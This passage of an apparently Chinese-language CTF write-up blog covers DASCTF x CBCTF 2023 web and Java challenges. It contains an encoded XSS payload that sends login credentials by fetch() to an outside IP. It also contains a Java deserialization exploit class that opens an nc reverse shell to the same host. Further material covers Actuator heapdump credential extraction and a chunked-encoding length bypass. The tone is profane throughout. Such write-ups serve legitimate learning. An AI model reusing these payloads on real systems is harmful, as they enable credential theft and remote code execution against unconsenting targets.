0073\u0077\u006f\u0072\u0064\u0022\u0020\u0074\u0079\u0070\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0050\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0062\u0075\u0074\u0074\u006f\u006e\u0020\u006f\u006e\u0063\u006c\u0069\u0063\u006b\u003d\u0022\u0066\u0065\u0074\u0063\u0068\u0028\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0034\u0033\u002e\u0031\u0034\u0033\u002e\u0031\u0039\u0032\u002e\u0031\u0039\u003a\u0031\u0031\u0034\u0035\u002f\u0027\u002c\u007b\u006d\u0065\u0074\u0068\u006f\u0064\u003a\u0027\u0050\u004f\u0053\u0054\u0027\u002c\u0062\u006f\u0064\u0079\u003a\u0024\u0028\u0027\u0023\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u002b\u0027\u005f\u005f\u005f\u0027\u002b\u0024\u0028\u0027\u0023\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u007d\u0029\u003b\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u006c\u006f\u0067\u0069\u006e\u0022\u003e\u004c\u006f\u0067\u0069\u006e\u003c\u002f\u0062\u0075\u0074\u0074\u006f\u006e\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0066\u006f\u0072\u006d\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u002f\u0062\u006f\u0064\u0079\u003e\u000a\u003c\u002f\u0068\u0074\u006d\u006c\u003e`&lt;/sCrIpT&gt;</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./npc -config ./conf/npc.conf</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101233054.png" alt="微信截图_20231101233054"></p>
<p>终于拿到了艹，30s 点一次，👴tm 以为 x 不进去了</p>
<p>まだまだね、弱い！</p>
<h1 id="deserializeupload"><a class="markdownIt-Anchor" href="#deserializeupload">#</a> Deserialize?Upload!</h1>
<h2 id="actuator"><a class="markdownIt-Anchor" href="#actuator">#</a> actuator😫</h2>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102082010.png" alt="微信截图_20231102082010"></p>
<p>首先，题目有个🚢♥的依赖，显然👴不知道这是干啥的，怎么办，学！</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/caoweixiong/p/15325382.html">Spring boot——Actuator 详解 - 曹伟雄 - 博客园 (cnblogs.com)</a></p>
<p>配置方面</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>有了这个依赖，那么 Spring 就会自动开放 <code>/actuator/health</code>  和 <code>/actuator/info</code>  这两个路径</p>
<p>访问 <code>[127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/)</code> , 可以得到 /acturator 的路由</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"_links"</span>: {</span><br><span class="line">        <span class="string">"self"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"health"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/health"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"health-path"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/health/{*path}"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">true</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"info"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/info"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"env"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/env"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"env-toMatch"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/env/{toMatch}"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">true</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"heapdump"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/heapdump"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>以下是一些经常使用的路径</p>
<table>
<thead>
<tr>
<th style="text-align:center">HTTP 方法</th>
<th style="text-align:center">Endpoint</th>
<th style="text-align:center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator</td>
<td style="text-align:center">查看有哪些路径</td>
</tr>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator/env</td>
<td style="text-align:center">查看所有环境属性，看 Spring 的的 properties, 但是会自动脱敏掉一些 secret key 等敏感信息</td>
</tr>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator/health</td>
<td style="text-align:center">查看运行指标</td>
</tr>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator/info</td>
<td style="text-align:center">查看 properties 中 info 开头的属性，沒啥用</td>
</tr>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator/heapdump</td>
<td style="text-align:center">获取 JVM 的 heap dump</td>
</tr>
</tbody>
</table>
<p>🤣默认 Actuator  <code>/actuator/health</code>  和 <code>/actuator/info</code>  两个 endpoint，如果要开放其他 endpoint 的話，需在在 application.properties 中做设置。<img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102085646.png" alt="微信截图_20231102085646"></p>
<p>Heap dump（堆转储）是指将一个 Java 进程的内存中的对象信息和数据结构以二进制格式写入文件，以便进行内存分析和排查内存泄漏等问题。Heap dump 包含了 Java 堆内存中的对象实例、对象引用关系、类信息等，它是诊断和调试 Java 应用程序的重要工具之一。</p>
<p>👴说点人话：反正 Heap dump 事内存相关的东西，肯定有敏感信息，👴就是要把它下下来进行一通乱超，不知道你们怎么忍得住的，事👴直接拿起来狠狠地分析.</p>
<p>怎么分析，当时事用 jdk 自带的 jhat</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jhat -J-Xmx512M <span class="string">"/path/to/heapdump"</span></span><br></pre></td></tr></tbody></table></figure>
<p>然后就会本地起一个服务器，里面就加载内存的内容</p>
<p>md, 依托✍特，</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">securityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"/"</span>})).permitAll().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"/admin/**"</span>})).authenticated().and()).formLogin().loginProcessingUrl(<span class="string">"/login"</span>)).permitAll()).and()).csrf().disable();</span><br><span class="line">        <span class="keyword">return</span> (SecurityFilterChain)http.build();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>🧀spring 安全配置， <code>http.authorizeRequests().antMatchers(new String[]{"/"}).permitAll()</code>  表示对 / 路由访问允许任意用户，</p>
<p><code>antMatchers(new String[]{"/admin/**"}).authenticated()</code>  表示 <code>/admin/</code>  开头验证用户</p>
<p><code>.formLogin().loginProcessingUrl("/login").permitAll()</code> /login 的表达登录不需要验证</p>
<p>这里就是让👴拿到 password</p>
<h2 id="题目实践"><a class="markdownIt-Anchor" href="#题目实践">#</a> 题目实践😓😡</h2>
<p>wcsndm,sb 东西，题目环境没了，行吧，👴本地搭一个，nmd 套模板整了个 docker-compose, 告诉👴nmd <code>project name must not be empty</code> , 你 tmd 倒是告诉👴哪里没有 project name, 阿米诺斯，一格德拉米.</p>
<p>只能手动 docker build.</p>
<p>同样拿到 heapdump</p>
<p>直接打开</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvisualvm</span><br></pre></td></tr></tbody></table></figure>
<p>别问👴哪里装，这 nmjava 自带的</p>
<p>进行一波 OQL 查询</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key)</span><br></pre></td></tr></tbody></table></figure>
<p>这里用的事正则测试 /rgexp/.test () 的形式，虽然里面内容没用到啥正则，只是走个形式而已，别问👴为啥不直接查 value,nmd value 是个对象还未知，你查个√⑧.</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102101315.png" alt="微信截图_20231102101315"></p>
<p>tmd /login 登进去，让👴看看怎么个事</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102102004.png" alt="微信截图_20231102102004"></p>
<p>源赖氏一个后台管理系统，能用文件上传功能的地方.</p>
<h2 id="反序列化分析"><a class="markdownIt-Anchor" href="#反序列化分析">#</a> 反序列化分析😛</h2>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping({"/deserialize"})</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="meta">@RequestParam("b64str")</span> String b64str)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">byte</span>[] serialized = Base64.getDecoder().decode(b64str);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">SafeObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>很美好对吧，jackson 链直接打，但是👴发现了不对劲，md 有毒</p>
<p>还是看看远处的 <code>SafeObjectInputStream</code>  吧</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SafeObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass input) <span class="keyword">throws</span> IOException, ClassNotFoundException {</span><br><span class="line">        <span class="keyword">if</span> (BLACKLIST.contains(input.getName())) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">"Hacker!!"</span>);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(input);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> {</span><br><span class="line">        BLACKLIST.add(<span class="string">"com.fasterxml.jackson.databind.node.POJONode"</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">"java.security.SignedObject"</span>);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>都给你 ban 了，rnm, 出题人真的阴险，现在不把 jackson 链 ban 了，都不敢反序列化了是吧😅</p>
<p>怎么绘世呢</p>
<h2 id="文件上传-反序列化组合拳"><a class="markdownIt-Anchor" href="#文件上传反序列化组合拳">#</a> 文件上传 + 反序列化组合拳😤</h2>
<p>题目给了文件上传的功能，那总不能不用吧，要不然题目整这 β÷ 玩意干嘛呀.😅</p>
<p>正好前面通过 env 泄露得知 java_home 的位置</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102103809.png" alt="微信截图_20231102103809"></p>
<p>什么，你不知道 java_home 事干嘛的？</p>
<p>来，跟👴一起念:</p>
<p><code>JAVA_HOME</code>  是一个环境变量，用于指示 Java 开发工具和应用程序在计算机上的安装位置。它主要用于以下几个方面的作用：</p>
<ol>
<li><strong>Java 开发工具的定位</strong>： <code>JAVA_HOME</code>  变量告诉计算机的操作系统和其他开发工具 Java 开发工具的安装位置。这对于编译、运行和调试 Java 程序非常重要。例如，当你使用 Java 编译器 ( <code>javac</code> ) 编译 Java 代码时，系统需要知道  <code>JAVA_HOME</code>  的位置以找到  <code>javac</code>  可执行文件。</li>
<li><strong>Java 运行时环境（JRE）的定位</strong>：除了开发工具， <code>JAVA_HOME</code>  也可以用于定位 Java 运行时环境（JRE）的位置。JRE 包含了运行 Java 应用程序所需的类库和运行时组件。如果你的系统上有多个不同版本的 Java 安装，设置  <code>JAVA_HOME</code>  可以确保你使用的是正确的 Java 版本。</li>
<li><strong>应用程序的定位</strong>：某些 Java 应用程序可能需要知道 Java 的安装位置，以便正确配置自己。通过设置  <code>JAVA_HOME</code>  环境变量，这些应用程序可以轻松找到所需的 Java 运行时环境。</li>
<li><strong>开发工具和构建工具的配置</strong>：许多 Java 集成开发环境（IDE）和构建工具（如 Maven 和 Gradle）使用  <code>JAVA_HOME</code>  变量来配置其内部使用的 Java 环境。这有助于确保项目在正确的 Java 版本下编译和运行。</li>
<li><strong>跨平台兼容性</strong>：通过使用  <code>JAVA_HOME</code>  变量，可以使 Java 开发环境在不同的操作系统上更具可移植性。它允许开发人员编写一次代码，然后在不同平台上使用相同的  <code>JAVA_HOME</code>  变量来运行代码。</li>
</ol>
<p>总之， <code>JAVA_HOME</code>  是一个关键的环境变量，用于确保计算机上的 Java 开发工具、应用程序和运行时环境能够正确地找到和使用 Java 安装。它在 Java 开发和部署过程中起到重要作用，特别是在多版本 Java 安装和跨平台开发的情况下。</p>
<p>不说人话就是这样，这是伟大的 ChatGPT 说的，👴翻译一下就是，运行脚本的位置在那，要运行的 class 也在那，所以有啥 class 放那，他就能加载啥 class.</p>
<p>所以接下来要干啥懂了没，上传点具有攻击性的 class 到 javahome 里面，狠狠地入它一波.</p>
<p>而且不是有反序列化吗，到这你不可能还不知道吧，创造一个反序列化带有直接恶意操作的类，直接 getshell😊</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> InterruptedException, IOException, ClassNotFoundException {</span><br><span class="line"></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"nc"</span>,<span class="string">"43.143.192.19"</span>,<span class="string">"1145"</span>,<span class="string">"-e"</span>,<span class="string">"/bin/sh"</span>});</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="keyword">if</span>(p.exitValue()!=<span class="number">0</span>){</span><br><span class="line">        }</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((s=reader.readLine())!=<span class="literal">null</span>){</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>写个 exp 类，编译好后再上传，别直接 sb 到把 java 上传了</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102150011.png" alt="微信截图_20231102150011"></p>
<p>但是👴不太高兴，因为有点 bug, 第一次搭 docker 打不成，第二次终出了😒.</p>
<h1 id="dasctfxcbctf_2023_bypassjava"><a class="markdownIt-Anchor" href="#dasctfxcbctf_2023_bypassjava">#</a> DASCTFXCBCTF_2023_bypassJava</h1>
<p>真 tm 恶心的 java 题，不仅有绕过，还 tm 有 RASP 这种抽象的东西，👴太弱了，👴要学.</p>
<p>题目环境甚至不是靶机，而是静态资源，很不爽.</p>
<p>还好出题人开源了:<a target="_blank" rel="noopener" href="https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava">pankass/DASCTF_X_CBCTF2023_bypassJava: 题目源码和 docker 环境 (github.com)</a></p>
<h2 id="content-length-限制"><a class="markdownIt-Anchor" href="#content-length限制">#</a> Content-Length 限制</h2>
<p>不多说，第一时间想到 jackson 链子，但是有长度限制</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102154201.png" alt="微信截图_20231102154201"></p>
<p>这长度限制是人能想出来的吗😓,nm 稍微大一点，随便不都得几千？</p>
<p>过不了，根本过不了，让我看看 bypass 怎么个事:<img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102155013.png" alt="微信截图_20231102155013"></p>
<p>这里如果头部有 transfer-encoding, 就会进 <code>addInputFilter</code></p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102160618.png" alt="微信截图_20231102160618"></p>
<p>这里面如果有 chunked, 那么就会设置成 <code>this.contentDelimitation</code>  为 true</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102160810.png" alt="微信截图_20231102160810"></p>
<p>最后这里就会进入 if, 从而设置 ContentLength 为 - 1, 绕过长度限制.</p>
<h2 id="chuncked-编码怎么发"><a class="markdownIt-Anchor" href="#chuncked编码怎么发">#</a> chuncked 编码怎么发</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xuehaoyue/p/6639029.html">分块编码（Transfer-Encoding: chunked） - 妙音天女 - 博客园 (cnblogs.com)</a></p>
<p>简单看一下们大概就是</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">十六进制长度/r/n</span><br><span class="line"> content/r/n</span><br><span class="line">  ....  </span><br><span class="line">    </span><br><span class="line"><span class="number">0</span>/r/n</span><br><span class="line"> /r/n</span><br></pre></td></tr></tbody></table></figure>
<p>每一块都是 <code>十六进制表示长度</code> 然后， <code>/r/n</code></p>
<p>接着输入 content, 然后 <code>/r/n</code></p>
<p>最后一块一定要输入 <code>0/r/n/r/n</code></p>
<p>👴浅浅写个脚本</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">"http://127.0.0.1:8080/read"</span></span><br><span class="line">content = open(<span class="string">"data.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">leng = hex(len(content)).replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">body = leng+<span class="string">"\r\n"</span>+content+<span class="string">"\r\n0\r\n\r\n"</span></span><br><span class="line">print(body)</span><br><span class="line"></span><br><span class="line">headers= {<span class="string">"transfer-encoding"</span>:<span class="string">"chunked"</span>}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=body,headers=headers)</span><br></pre></td></tr></tbody></table></figure>
<p>soeasy,🤣,</p>
<p>然而这只是第一步，👴现场甚至第一步都没过去.</p>
<h2 id="不稳定-jackson-链问题"><a class="markdownIt-Anchor" href="#不稳定jackson链问题">#</a> 不稳定 jackson 链问题</h2>
<p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">关于 java 反序列化中 jackson 链子不稳定问题 (pankas.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12846">从 JSON1 链中学习处理 JACKSON 链的不稳定性 - 先知社区 (aliyun.com)</a></p>
<p>👴ctmd 打 jackson 链子的时候，有史以来第一次遇见了陌生的报错</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[<span class="string">"stylesheetDOM"</span>])</span><br></pre></td></tr></tbody></table></figure>
<p>且经过本地调试，似乎进入了陌生的代码段，👴很不乐意.</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103150351.png" alt="微信截图_20231103150351"></p>
<p>具体来说，就是在调用 getters 的时候，优先奏了 <code>getStylesheetDOM</code>  这个方法，但是，众所周知，我们在序列化的时候，是不会去设置这个值的，所以理所应当的，nmd 空指针了.😓😅而当其调用 getter 方法时优先调用  <code>getOutputProperties</code>  方法时才是我们正常想要的结果。</p>
<p>这 nm 真有坑啊，比赛想打这条链子，不说 ban 位问题，nmd 这问题也只能通过不停地重置靶机解决了，比赛你重置靶机，静态地址等似吧.</p>
<p>现在👴来分析一下怎么个事，优化一下</p>
<h3 id="流程"><a class="markdownIt-Anchor" href="#流程">#</a> 流程</h3>
<p>这条链子分析👴不想说了，闭着眼睛都知道怎么个事.</p>
<p>关键是触发 <code>POJONode</code>  的 <code>toString</code>  方法，然后内部经过一系列序列化器调用  <code>POJONode</code>  中封的  <code>_value</code>  属性的 getter 方法，从而调用  <code>TemplatesImpl</code>  类型对象的  <code>getOutputProperties</code>  方法从而导致执行任意代码。</p>
<p>重点就是从 <code>toString</code>  到 <code>getters</code>  的调用这一过程</p>
<p>栈调试放在这:</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider 